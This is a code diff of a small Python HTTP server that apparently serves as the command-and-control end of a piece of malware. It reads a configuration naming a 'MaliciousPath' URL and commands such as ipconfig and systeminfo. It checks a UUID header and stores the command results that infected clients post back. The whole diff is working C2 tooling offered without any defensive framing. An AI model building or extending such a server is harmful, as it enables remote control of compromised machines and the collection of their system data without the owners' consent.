@@ -4,15 +4,32 @@ import urllib.request
 import os
 import json
 
-hostName = "localhost" #ip
-hostPort = 80 #443
+hostName = "A" #ip
+hostPort = 0 #443
+UUID = ''
+MaliciousPath = ''
+Commands=[]
+Configuration = "{'Server': 'localhost', 'Commands':['ipconfig','systeminfo'],'MaliciousURL': 'httpL//localhost/malicious'}"
 
-UUID = '5a968c26-b565-4b65-8445-9e87780cb8f9-01'
-MaliciousPath = '/MaliciousPath'
-Configuration = "{'Server': '"+hostName+"', 'Commands':['systeminfo','ipconfig'],'MaliciousURL': '"+hostName+MaliciousPath+"'}"
+def ConfigurationServer():
+    with open('configuration.json') as f:
+        confFileJson = json.load(f)
+        global hostName
+        global hostPort
+        global UUID
+        global MaliciousPath
+        global Commands
+        global Configuration
 
-with open('configuration.json', 'w') as outfile:
-    json.dump(Configuration, outfile)
+        hostName = confFileJson['Server']
+        hostPort = confFileJson['Port']
+        UUID = confFileJson['UUID']
+        MaliciousPath = confFileJson['MaliciousPath']
+        Commands = confFileJson['Commands']
+
+        Configuration = {"Server": hostName, "Commands":Commands,"MaliciousURL": hostName+MaliciousPath}
+        print(Commands)
+        print(Configuration)
 
 class MyServer(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -38,11 +55,22 @@ class MyServer(BaseHTTPRequestHandler):
         if (self.headers.get('UUID') == UUID):
             if self.path.endswith("/Commands"):
                 print('Got POST Command')
-                file = open("commands.txt","a+")
-                file.write()
+                self.data_string = self.rfile.read(int(self.headers['Content-Length']))
 
+                self.send_response(200)
+                self.end_headers()
 
+                data = json.loads(self.data_string)
+                print(data)
+                with open("commandResults.json", "a+") as outfile:
+                    json.dump(data, outfile)
+                #print (data)
+                #file = open("commands.txt","a+")
+                self.wfile.write(("Done").encode())
+                return
 
+ConfigurationServer()
+print(hostName)
 myServer = HTTPServer((hostName, hostPort), MyServer)
 print(time.asctime(), "Server Starts - %s:%s" % (hostName, hostPort))
 
